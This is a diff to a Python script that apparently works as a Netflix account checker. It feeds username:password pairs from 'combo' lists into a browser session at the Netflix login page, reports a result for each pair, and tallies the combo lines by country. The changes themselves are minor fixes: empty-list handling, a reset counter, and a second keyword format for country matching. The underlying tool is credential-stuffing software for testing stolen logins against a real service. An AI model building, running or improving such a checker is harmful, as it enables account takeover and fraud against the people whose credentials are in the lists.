@@ -62,6 +62,7 @@ for file_ in range(len(files)):
 		
 page = "https://www.netflix.com/login"
 while True:
+	counter =0
 	title()
 	return_split_method = print_ip_and_country()
 	user_options()
@@ -72,6 +73,9 @@ while True:
 			title()
 			print_ip_and_country()
 			while counter < len(user):
+					if len(user) == 0:
+						print("\n\033[38;5;226mNo Accounts for current country.\n")
+						break
 					try:
 						print("\033[38;5;7m\nConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo No.{}:\033[38;5;190m {}:{} \033[38;5;7m| Result: ".format(str(counter), user[counter], passw[counter].strip()),end='')
 						browser_options = Options()
@@ -128,18 +132,17 @@ while True:
 									resume.write("{}\n".format(updated_list[line].strip()))
 							resume.close()
 							exit()
-			if len(user) == 0:
-				print("\n\033[38;5;226mNo Accounts for current country.\n")
 			print("\n\033[38;5;226mAll done.")
+			input("\n\033[38;5;226mPress Enter.")
 			if resume_flag == True:
 				os.remove('resume')
-				title()
-			break				
+			break
 		if options == "2":		
 			#Countries List in File and Stats
 			if return_split_method == True:
 				title()
 				combolist_countries = {}
+				key_words = ["Country: ", "Country = "]
 				counter = 0
 				lines_counter = 0
 				recurrence = 1
@@ -149,7 +152,8 @@ while True:
 				full_countries_list_from_dict = list(countries)
 				while counter < len(full_countries_list_from_dict):
 					while lines_counter < len(combo_lines):
-						if "Country: " + countries[full_countries_list_from_dict[counter]] in combo_lines[lines_counter]:
+						# here comes cancer
+						if [key_word+countries[full_countries_list_from_dict[counter]] for key_word in key_words if(key_word+countries[full_countries_list_from_dict[counter]] in combo_lines[lines_counter])]:
 							combolist_countries.update({full_countries_list_from_dict[counter]:recurrence})
 							recurrence += 1
 						lines_counter += 1
@@ -174,8 +178,7 @@ while True:
 			else:
 				title()
 				input("\033[38;5;7m\n\nNo countries to sort. \nPress Enter to return")
-				break
-				
+				break		
 		if options == "q":
 			#Exit
 			exit()
